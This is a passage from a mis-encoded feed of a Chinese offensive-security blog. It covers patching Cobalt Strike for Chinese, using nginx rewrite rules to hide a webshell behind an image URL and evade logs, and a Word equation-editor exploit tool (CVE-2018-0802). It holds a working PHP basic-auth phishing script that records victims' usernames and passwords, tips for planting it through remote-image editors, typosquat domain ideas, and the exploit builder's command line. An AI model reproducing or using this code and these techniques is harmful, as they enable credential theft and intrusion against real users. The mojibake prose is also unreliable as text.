CommonUtils.bString(CommonUtils.readAll(in));</span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢ï¼Œä¹‹åç»è¿‡æµ‹è¯• <code>type == 22</code> æ˜¯å›æ˜¾æ–‡ä»¶åˆ—è¡¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹è¿™éƒ¨åˆ†å°±å¥½äº†ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3866425879.png" alt="1522599287195.png"></p><p>è¿™æ ·å°±ä¸ä¼šé€ æˆç¨‹åºå…¶ä»–åŠŸèƒ½ä¸Šçš„é”™è¯¯äº†ã€‚å…³äºä¸Šä¼ ï¼Œä¸‹è½½ï¼Œæ‰§è¡Œç­‰ï¼Œéƒ½å†™åœ¨<code>TaskBeacon.class</code> é‡Œé¢ï¼Œå¯ä»¥é’ˆå¯¹æ€§å¯¹å…¶ç¼–ç è¿›è¡Œä¿®æ”¹ã€‚è¿™é‡Œå°±ä¸è¯¦ç»†è¯´æ˜äº†ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±å»è¯»ä¸€ä¸‹ä»£ç ï¼Œå…³äºæ–‡ä»¶æµè§ˆï¼Œæˆ‘ä»¬å¯ä»¥å®šä½åˆ°<br><code>aggressor/windows/FileBrowser.class</code>,å…¶åŒå‡»äº‹ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3827844514.png" alt="1522637355520.png"></p><p>è°ƒç”¨äº†<code>ls</code> æ–¹æ³•ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3527026008.png" alt="1522637409194.png"></p><p>ls æ–¹æ³•è°ƒç”¨äº† <code>beacons.task_ls</code>,å¿«é€Ÿå®šä½åˆ°<code>server/Beacons.class</code>, ç”±äºåŒå‡»äº‹ä»¶æ˜¯å–å¾—è¿”å›è½¬ç ä»¥åçš„æ–‡å­—ï¼Œæ‰€ä»¥è¦è®©åŠŸèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œæˆ‘ä»¬éœ€è¦å†å°†ç¼–ç è½¬å›å»ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/1930021514.png" alt="1522637549907.png"></p><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨æ–‡ä»¶æµè§ˆåŠŸèƒ½äº†ï¼Œä»¥ä¸Šæ›¿æ¢çš„classæ–‡ä»¶å·²ç»æ¨åˆ°äº†githubï¼Œæ¬¢è¿å°ä¼™ä¼´ä¸€èµ·æ¥ä¿®æ”¹bug~</p><p>GIT : <a href="https://github.com/ridter/CS_Chinese_support" target="_blank" rel="noopener">CS_Chinese_support</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç®€ä»‹&quot;&gt;&lt;/a&gt;0x00 ç®€ä»‹&lt;/h2&gt;&lt;p&gt;cobaltstrike3.10 å·²ç»å‡ºæ¥å¾ˆä¹…äº†ï¼Œå…¶ä¸­æœ€å¸å¼•äººçš„å¯èƒ½å°±æ˜¯ä»–å·²ç»æ”¯æŒä¸­æ–‡äº†ï¼Œä½†æ˜¯è²Œä¼¼å¾ˆ
      
    
    </summary>
    
      <category term="å·¥å…·æ”¶é›†" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>Hack with rewrite</title>
    <link href="https://evi1cg.github.io/archives/hack_with_rewrite.html"/>
    <id>https://evi1cg.github.io/archives/hack_with_rewrite.html</id>
    <published>2018-03-07T22:26:00.000Z</published>
    <updated>2019-01-15T05:43:36.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h2><p>å¤§å®¶éƒ½çŸ¥é“apacheï¼Œnginxç­‰æœ‰rewriteçš„åŠŸèƒ½ï¼Œé€šè¿‡rewriteè§„åˆ™å¯ä»¥æŠŠè¾“å…¥çš„URLè½¬æ¢æˆå¦ä¸€ä¸ªURLï¼Œè¿™æ˜¯æˆ‘ä»¬å¸¸è§çš„ä¸€ç§éœ€æ±‚ï¼Œå¯ä»¥è®©æˆ‘ä»¬çš„urlå˜å¾—æ›´åŠ ç®€æ´ã€‚ä½†æ˜¯å…¶å®è¿™ä¸ªåŠŸèƒ½ä¹Ÿå¯è¢«ç”¨äºä¸€äº›åˆ«çš„ç›®çš„ã€‚ä¸‹é¢å°±ç®€å•çš„ä»‹ç»ä¸€ä¸‹ã€‚</p><h2 id="0x01-åé—¨"><a href="#0x01-åé—¨" class="headerlink" title="0x01 åé—¨"></a>0x01 åé—¨</h2><p>å…³äºé€šè¿‡é…ç½®æ–‡ä»¶åšåé—¨å·²ç»æœ‰å¾ˆå¤šæ–‡ç« æœ‰äº†ä»‹ç»ï¼Œå³<a href="http://man.chinaunix.net/newsoft/ApacheManual/howto/htaccess.html" target="_blank" rel="noopener">.htaccess</a>å’Œ<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">.user.ini</a>æ–‡ä»¶æ„é€ åé—¨ï¼Œå…³äº.htaccessåé—¨å¯ä»¥çœ‹<a href="http://www.hackdig.com/02/hack-18445.htm" target="_blank" rel="noopener">è¿™é‡Œ</a>,user.iniåé—¨Pç‰›ä¹Ÿå‘è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œå¯ä»¥çœ‹<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">è¿™é‡Œ</a>,å½“ç„¶è¿˜æœ‰æŸ æª¬å¸ˆå‚…çš„<a href="http://www.cnblogs.com/iamstudy/articles/php_ini_backdoor.html" target="_blank" rel="noopener">php.iniæ„æˆçš„åé—¨</a>ã€‚é‚£ä¹ˆè·Ÿrewriteæœ‰ä»€ä¹ˆå…³ç³»å‘¢ã€‚å…¶å®rewriteä¸»è¦æ˜¯ä¸ºäº†<strong><code>é€ƒé¿æ—¥å¿—å®¡æŸ¥</code></strong>ï¼Œé€šè¿‡rewriteï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®ä¸€ä¸ªå›¾ç‰‡åç¼€çš„æ–‡ä»¶æ¥æ‰§è¡Œæˆ‘ä»¬çš„webshellï¼Œä½†æ˜¯ä¿®æ”¹è¿™äº›é…ç½®æ–‡ä»¶<code>éœ€è¦ä¸€å®šçš„æƒé™</code>ã€‚ä¸‹é¢æ¥è¿›è¡Œä¸€ä¸‹ç®€å•çš„ä»‹ç»ã€‚æµ‹è¯•çš„æ—¶å€™ä¸»è¦æ˜¯ä½¿ç”¨nginx,æ‰€ä»¥å¯¹nginxè¿›è¡Œä¸€ä¸‹ä»‹ç»ï¼Œå…³äºapacheçš„é…ç½®æœ‰å…´è¶£å¯ä»¥è‡ªå·±å»æŸ¥ä¸€æ³¢ã€‚ä¸‹é¢æ˜¯æˆ‘çš„é…ç½®ï¼š<br>ngingx.conf<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">worker_processes </span> 1;</span><br><span class="line"><span class="string">events </span>&#123;</span><br><span class="line">    <span class="string">worker_connections </span> <span class="string">1024;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http </span>&#123;</span><br><span class="line">    <span class="string">include </span>      <span class="string">mime.</span><span class="string">types;</span></span><br><span class="line">    <span class="string">default_type </span> <span class="string">application/</span><span class="string">octet-stream;</span></span><br><span class="line">    <span class="string">sendfile </span>       <span class="string">on;</span></span><br><span class="line">    <span class="string">keepalive_timeout </span> <span class="string">65;</span></span><br><span class="line">    <span class="string">include </span>/<span class="string">usr/</span><span class="string">local/</span><span class="string">nginx/</span><span class="string">vhosts/</span>*.<span class="string">conf;</span></span><br><span class="line">    <span class="string">server </span>&#123;</span><br><span class="line">        <span class="string">listen </span>      <span class="string">80;</span></span><br><span class="line">        <span class="string">server_name </span> <span class="string">localhost;</span></span><br><span class="line">        <span class="string">location </span>/ &#123;</span><br><span class="line">            <span class="string">root </span>  <span class="string">html;</span></span><br><span class="line">            <span class="string">index </span> <span class="string">index.</span><span class="string">html </span><span class="string">index.</span><span class="string">htm;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">error_page </span>  <span class="string">500 </span><span class="string">502 </span><span class="string">503 </span><span class="string">504 </span> /<span class="string">50x.</span><span class="string">html;</span></span><br><span class="line">        <span class="string">location </span>= /<span class="string">50x.</span><span class="string">html </span>&#123;</span><br><span class="line">            <span class="string">root </span>  <span class="string">html;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é…ç½®äº†å¤šä¸ªåŸŸåçš„é…ç½®ï¼Œæ‰€ä»¥é’ˆå¯¹æŸä¸ªåŸŸåçš„é…ç½®æ–‡ä»¶åœ¨vhostsé‡Œé¢ï¼Œè¦é…ç½®çš„åŸŸåçš„é…ç½®æ–‡ä»¶ï¼šmydomain.conf<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">server </span>&#123;</span><br><span class="line">    <span class="string">listen </span><span class="string">80;</span></span><br><span class="line">    <span class="string">server_name </span> <span class="string">mydomain.</span><span class="string">com;</span></span><br><span class="line">    <span class="string">root </span>/<span class="string">www/</span><span class="string">mydomain;</span></span><br><span class="line">    <span class="string">index </span><span class="string">index.</span><span class="string">html </span><span class="string">index.</span><span class="string">php;</span></span><br><span class="line">    <span class="string">if </span>( $<span class="string">query_string </span>~* <span class="string">".*[\;'\&lt;\&gt;].*"</span> )&#123;</span><br><span class="line">        <span class="string">return </span><span class="string">404;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">location </span>~ .*\.(<span class="string">gif|</span><span class="string">jpg|</span><span class="string">jpeg|</span><span class="string">bmp|</span><span class="string">png|</span><span class="string">swf|</span><span class="string">flv|</span><span class="string">ico)</span>$ &#123;</span><br><span class="line">        <span class="string">expires </span><span class="string">30d;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">location </span>~ .*\.(<span class="string">js|</span><span class="string">css)</span>?$ &#123;</span><br><span class="line">        <span class="string">expires </span><span class="string">7d;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">location </span>~ \.<span class="string">php$</span> &#123;</span><br><span class="line">        <span class="string">fastcgi_pass </span>  <span class="string">127.</span>0.0.<span class="string">1:9000;</span></span><br><span class="line">        <span class="string">fastcgi_index </span> <span class="string">index.</span><span class="string">php;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">include </span>       <span class="string">fastcgi_params;</span></span><br><span class="line">        <span class="comment">#è®¾ç½®PATH_INFOå¹¶æ”¹å†™SCRIPT_FILENAME,SCRIPT_NAMEæœåŠ¡å™¨ç¯å¢ƒå˜é‡</span></span><br><span class="line">        <span class="string">set </span>$<span class="string">fastcgi_script_name2 </span>$<span class="string">fastcgi_script_name;</span></span><br><span class="line">        <span class="string">if </span>($<span class="string">fastcgi_script_name </span>~ <span class="string">"^(.+\.php)(/.+)$"</span>) &#123;</span><br><span class="line">            <span class="string">set </span>$<span class="string">fastcgi_script_name2 </span>$1;</span><br><span class="line">            <span class="string">set </span>$<span class="string">path_info </span>$2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">PATH_INFO </span>$<span class="string">path_info;</span></span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">SCRIPT_FILENAME </span>  $<span class="string">document_root$</span><span class="string">fastcgi_script_name2;</span></span><br><span class="line">        <span class="string">fastcgi_param </span>  <span class="string">SCRIPT_NAME </span>  $<span class="string">fastcgi_script_name2;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¦é…ç½®é‡å®šå‘å¾ˆç®€å•ï¼Œåªéœ€è¦åŠ å…¥<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.png$</span> &#123;</span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^/img/test\.png$</span> /img/test.php <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ„æ€æ˜¯åŒ¹é…ä»¥pngç»“å°¾çš„urlï¼Œå¦‚æœåŒ¹é…åˆ° img/test.pngï¼Œåˆ™é‡å®šå‘åˆ° img/test.phpï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦åœ¨imgç›®å½•ä¸‹å­˜æ”¾test.phpï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—® <a href="http://domain.com/img/test.pngæ¥è®¿é—®ã€‚å¦‚ä¸‹å›¾" target="_blank" rel="noopener">http://domain.com/img/test.pngæ¥è®¿é—®ã€‚å¦‚ä¸‹å›¾</a>:<br><img src="https://evi1cg.github.io/usr/uploads/2018/03/2359099842.png" alt="1520482949500.png"></p><p>å…³äºæ›´å¤šåŒ¹é…çš„è§„åˆ™ï¼Œå¯ä»¥çœ‹<a href="http://seanlook.com/2015/05/17/nginx-location-rewrite/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><blockquote><p>é…ç½®å®Œéœ€è¦é‡å¯nginxæœåŠ¡ã€‚</p></blockquote><h2 id="0x02-åŸºç¡€è®¤è¯é’“é±¼"><a href="#0x02-åŸºç¡€è®¤è¯é’“é±¼" class="headerlink" title="0x02 åŸºç¡€è®¤è¯é’“é±¼"></a>0x02 åŸºç¡€è®¤è¯é’“é±¼</h2><p>å…³äºåŸºç¡€è®¤è¯é’“é±¼ï¼Œå…¶å®å¾ˆæ—©ä¹‹å‰å°±å·²ç»æœ‰æ–‡ç« ä»‹ç»è¿‡äº†ï¼Œæ¯”å¦‚<a href="http://www.freebuf.com/articles/web/147207.html" target="_blank" rel="noopener">å¦‚ä½•åˆ¶ä½œåŸºç¡€è®¤è¯é’“é±¼é¡µé¢</a>ã€‚å…¶å®åŸç†å°±æ˜¯åœ¨é¡µé¢ä¸­æ’å…¥ä¸€ä¸ªphpçš„imgï¼Œå³:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://site.com/1.php"</span><span class="attr">alt</span>=<span class="string">"Could not load image - Invalid credentils."</span>/&gt;</span>&gt;</span><br></pre></td></tr></table></figure></p><p>phpçš„ä»£ç å°±æ˜¯401çš„éªŒè¯ï¼Œå½“ç”¨æˆ·æ‰“å¼€è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œç”±äºè¯·æ±‚äº†<a href="http://site.com/1.phpï¼Œæ‰€ä»¥ä¼šå¼¹å‡ºéªŒè¯çš„é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ä¹‹åï¼Œå¯†ç åˆ™ä¼šè¢«æ”»å‡»è€…è®°å½•ã€‚" target="_blank" rel="noopener">http://site.com/1.phpï¼Œæ‰€ä»¥ä¼šå¼¹å‡ºéªŒè¯çš„é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ä¹‹åï¼Œå¯†ç åˆ™ä¼šè¢«æ”»å‡»è€…è®°å½•ã€‚</a></p><blockquote><p>æ³¨ï¼šè¿™ç§æ–¹æ³•é€‚ç”¨äºFirefoxå’ŒIEæµè§ˆå™¨ï¼ŒChromeå¹¶ä¸ä¼šå¼¹å‡ºåŸºç¡€è®¤è¯çª—å£ã€‚</p></blockquote><p>ä¸ºäº†è®©æ­¤æ”»å‡»è¾¾åˆ°æ›´å¥½åœ°éšè”½æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨rewriteæ¥é‡å†™urlã€‚åˆ™ä½¿å¾—è®¿é—®çš„é“¾æ¥æ–‡ä»¶åç¼€ä¸ºä¸€ä¸ªå›¾ç‰‡ã€‚ä¸ºäº†è¾¾åˆ°æ›´å¥½åœ°æ”»å‡»æ•ˆæœï¼Œå†™äº†ä»¥ä¸‹phpä»£ç ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$now = <span class="keyword">new</span> DateTime();</span><br><span class="line">$user = <span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_USER'</span>]) ? $_SERVER[<span class="string">'PHP_AUTH_USER'</span>] : <span class="string">""</span>;</span><br><span class="line">$pass = <span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_PW'</span>])   ? $_SERVER[<span class="string">'PHP_AUTH_PW'</span>]   : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> ($user &amp;&amp; $pass)&#123;</span><br><span class="line">    $fp = fopen(<span class="string">"count.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">    $content = fread($fp);</span><br><span class="line">    $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $all = file_get_contents(<span class="string">"count.txt"</span>);</span><br><span class="line">    fwrite($fp, $now-&gt;format(<span class="string">"Y-m-d H:i:s"</span>) . <span class="string">"\t"</span> . $ip . <span class="string">"\t"</span> . $user . <span class="string">":"</span> . $pass . <span class="string">"\n"</span>);</span><br><span class="line">    $line = substr_count($all,$ip);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($line &lt; <span class="number">2</span>)&#123;</span><br><span class="line">    header(<span class="string">'WWW-Authenticate: Basic realm="Corporate domain"'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">'content-type: image/png'</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"test.png"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä»£ç çš„åŠŸèƒ½å°±æ˜¯å¼¹å‡ºè®¤è¯çª—å£ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†è¾“å…¥çš„è´¦å·å¯†ç å­˜åˆ°count.txtï¼Œå¦‚æœæ­¤ç”¨æˆ·è¾“å…¥å·²è¾¾3æ¬¡ï¼ˆä¸€æ¬¡è¾“å…¥å¯èƒ½æ˜¯éšä¾¿è¾“å…¥çš„è´¦å·å¯†ç ï¼‰ï¼Œåˆ™è¾“å‡ºæ­£å¸¸å›¾ç‰‡ã€‚æ¼”ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/4878.gif" alt="4878.gif"><br>å½“ç„¶ï¼Œä½ å¯ä»¥è‡ªå·±å®šä¹‰å…¶ä»–åŠŸèƒ½ï¼Œæ¯”å¦‚å°†è´¦å·å¯†ç å‘é€åˆ°é‚®ç®±ç­‰ç­‰ã€‚</p><p>phpä»£ç å†™å¥½äº†ï¼Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ<br>å…¶å®æˆ‘ä»¬è¦åšåˆ°å°±æ˜¯æ‰¾å„ç§ç¼–è¾‘å™¨ï¼Œæ‰¾é‚£ç§å¯ä»¥è¿œç¨‹æ’å…¥å›¾ç‰‡çš„ï¼Œç„¶åæ’å…¥æˆ‘ä»¬çš„é“¾æ¥ï¼Œå¦‚æœç½‘ç«™ç›´æ¥æŠŠé“¾æ¥æ’å…¥ç½‘ç«™ï¼Œé‚£ä¹ˆåœ¨åŠ è½½çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½æˆ‘ä»¬çš„éªŒè¯é¡µé¢ã€‚rewriteé™¤äº†å¯ä»¥è®©åç¼€çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå…¶å®è¿˜å¯ä»¥å¯¹ä¸€äº›ç¼–è¾‘å™¨è¿›è¡Œç»•è¿‡ï¼Œæ¯”å¦‚æ’å…¥è¿œç¨‹å›¾ç‰‡çš„æ—¶å€™ï¼Œç¼–è¾‘å™¨å¯¹å›¾ç‰‡è¿›è¡Œé¢„è§ˆ:</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/826095912.png" alt="1520488071492.png"></p><p>ç¢°åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆä½¿ç”¨é»˜è®¤é…ç½®çš„nginxæ’å…¥å›¾ç‰‡ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/03/4126320578.png" alt="1520488284941.png"></p><p>æ’å…¥æˆåŠŸå¹¶æäº¤ä»¥åï¼Œå†é‡æ–°ä¿®æ”¹rewriteã€‚è¿™æ ·å¯ä»¥è¿›è¡Œä¸€äº›ç»•è¿‡ã€‚æŸç§æƒ…æ™¯çš„æ”»å‡»å¦‚ä¸‹ï¼š<br>demo:<br><img src="https://evi1cg.github.io/usr/uploads/2018/03/387318502.gif" alt="demo.gif"></p><p>ä¸ºäº†è¾¾åˆ°æ›´å¥½åœ°æ•ˆæœã€‚æ”»å‡»è€…å¯ä»¥æ³¨å†Œä¸€ä¸ªçœ‹èµ·æ¥å—ä¿¡ä»»çš„åŸŸåã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœæ”»å‡»è€…çš„ç›®æ ‡æ˜¯targetdomain.comï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥æ³¨å†Œå¦‚ä¸‹çš„ç±»ä¼¼åœ°å€ï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">targetdomain.co</span><br><span class="line">targetdomain.net</span><br><span class="line">target-domain.com</span><br><span class="line">targetdomain-oauth.com</span><br><span class="line">targetdomain-cdn.com</span><br><span class="line">targetdomain-images.com</span><br><span class="line">login-targetdomain.com</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç®€ä»‹&quot;&gt;&lt;/a&gt;0x00 ç®€ä»‹&lt;/h2&gt;&lt;p&gt;å¤§å®¶éƒ½çŸ¥é“apacheï¼Œnginxç­‰æœ‰rewriteçš„åŠŸèƒ½ï¼Œé€šè¿‡rewriteè§„åˆ™å¯ä»¥æŠŠè¾“å…¥çš„URL
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-0802åˆ©ç”¨</title>
    <link href="https://evi1cg.github.io/archives/CVE_2018_0802.html"/>
    <id>https://evi1cg.github.io/archives/CVE_2018_0802.html</id>
    <published>2018-01-12T03:41:00.000Z</published>
    <updated>2019-01-16T05:12:48.647Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨CVE-2017-11882ä¹‹åï¼Œ2018å¹´1æœˆä»½åˆå‡ºäº†ä¸€ä¸ªæ–°çš„â€œå™©æ¢¦å…¬å¼äºŒä»£â€ï¼Œåœ¨é‡æ ·æœ¬åµŒå…¥äº†åˆ©ç”¨Ndayæ¼æ´å’Œ0dayæ¼æ´çš„2ä¸ªå…¬å¼å¯¹è±¡åŒæ—¶è¿›è¡Œæ”»å‡»ï¼ŒNdayæ¼æ´å¯ä»¥æ”»å‡»æœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿï¼Œ0dayæ¼æ´åˆ™æ”»å‡»å…¨è¡¥ä¸ç³»ç»Ÿï¼Œç»•è¿‡äº†CVE-2017-11882è¡¥ä¸çš„ASLRï¼ˆåœ°å€éšæœºåŒ–ï¼‰å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œæ”»å‡»æœ€ç»ˆå°†åœ¨ç”¨æˆ·ç”µè„‘ä¸­æ¤å…¥æ¶æ„çš„è¿œç¨‹æ§åˆ¶ç¨‹åºã€‚å…³äºæ­¤æ¼æ´çš„åˆ†æï¼Œå¯ä»¥çœ‹<a href="http://www.freebuf.com/vuls/159789.html" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼Œä»Šå¤©çœ‹åˆ°åœ¨githubå…¬å¼€äº†ä¸€ä¸ªCVE-2018-0802çš„åˆ©ç”¨è„šæœ¬ï¼Œåœ°å€<a href="https://github.com/zldww2011/CVE-2018-0802_POC" target="_blank" rel="noopener">åœ¨è¿™</a>ï¼Œä¸ºäº†è¾¾åˆ°æœ€å®Œç¾çš„åˆ©ç”¨ï¼Œæ‰€ä»¥ç¼–å†™äº†RTF_11882_0802ã€‚ </p><p>GITï¼š<a href="https://github.com/ridter/RTF_11882_0802" target="_blank" rel="noopener">RTF_11882_0802</a></p><p>æ­¤è„šæœ¬é›†åˆäº†ä¸¤ä¸ªå…¬å¼åˆ©ç”¨æ¼æ´ã€‚</p><p>åˆ©ç”¨æ–¹å¼ä¸ä¹‹å‰çš„æ–¹å¼ä¸€æ ·ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RTF_11882_0802.py -c <span class="string">"cmd.exe /c calc.exe"</span>  -i test.rtf -o test.doc</span><br></pre></td></tr></table></figure></p><p>å…¶å®å°±æ˜¯ç®€å•ç²—æš´çš„æŠŠä¸¤ä¸ªå…¬å¼ç¼–è¾‘å™¨æ’å…¥æ–‡æ¡£ä¸­ï¼Œä¸€ä¸ªæ˜¯11882ï¼Œä¸€ä¸ªæ˜¯0802ã€‚</p><p>â€œå™©æ¢¦å…¬å¼äºŒä»£â€ï¼ˆCVE-2018-0802ï¼‰æ‰€ä½¿ç”¨çš„0dayæ¼æ´å ªç§°CVE-2017-11882çš„åŒèƒèƒæ¼æ´ï¼Œæ”»å‡»æ ·æœ¬ä¸­çš„ä¸€ä¸ªæ¼æ´é’ˆå¯¹æœªæ‰“è¡¥ä¸å‰çš„ç³»ç»Ÿï¼Œå¦å¤–ä¸€ä¸ªæ¼æ´é’ˆå¯¹æ‰“è¡¥ä¸åçš„ç³»ç»Ÿï¼Œåˆ©ç”¨ä¸¤ä¸ªOLEåŒæ—¶è¿›è¡Œæ”»å‡»ï¼Œé»‘å®¢ç²¾å¿ƒæ„é€ çš„æ”»å‡»å®Œç¾å…¼å®¹äº†ç³»ç»Ÿæ¼æ´è¡¥ä¸ç¯å¢ƒçš„ä¸åŒæƒ…å†µã€‚è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æŠ€å·§å’ŒBypass ASLRçš„æ–¹å¼éƒ½å¸¦æœ‰ä¸€å®šçš„å·§åˆæ€§ï¼Œå‡å¦‚EQNEDT32.EXEæ¨¡å—å†…æ²¡æœ‰ä¸€æ¡æ»¡è¶³æ¡ä»¶çš„retæŒ‡ä»¤å¯ä»¥ç”¨æ¥ç»•è¿‡ASLRï¼Œå‡å¦‚lpLogFontä¸æ˜¯sub_21774çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå‡å¦‚CVE-2017-11882çš„è¡¥ä¸ä¿®å¤æ–¹å¼å¼ºåˆ¶å¼€å¯äº†DEPä¿æŠ¤ï¼Œâ€œå™©æ¢¦å…¬å¼äºŒä»£â€å°†æ²¡æœ‰å¯ä¹˜ä¹‹æœºã€‚</p><h3 id="è§£å†³æ–¹æ¡ˆ"><a 